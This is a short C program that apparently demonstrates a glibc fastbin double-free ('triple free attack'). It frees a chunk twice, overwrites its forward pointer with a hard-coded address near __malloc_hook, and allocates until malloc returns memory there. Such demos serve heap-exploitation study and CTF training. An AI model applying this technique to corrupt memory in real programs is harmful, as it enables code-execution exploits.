#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <string.h>
#define __malloc_hook 0x7ffff7dd1b10

void init() {
	setvbuf(stdout, 0, 2, 0);
	setvbuf(stdin, 0, 1, 0);
	setvbuf(stderr, 0, 1, 0);
}

long long data[0x20] = {0};

int main(){
	long *p,*q,*junk,*final;
	init();
	// init a chunk
	p = malloc(0x68);
	q = malloc(0x68);
	// triple free attack
	free(p);
	free(q);
	free(p);
	sleep(0);
	p = malloc(0x68);
	// malloc and change the fd
	p[0] = __malloc_hook - 0x23;
	sleep(0);
	junk = malloc(0x68);
	junk = malloc(0x68);
	final = malloc(0x68);
	printf("%p\n",final);
	sleep(0);
}

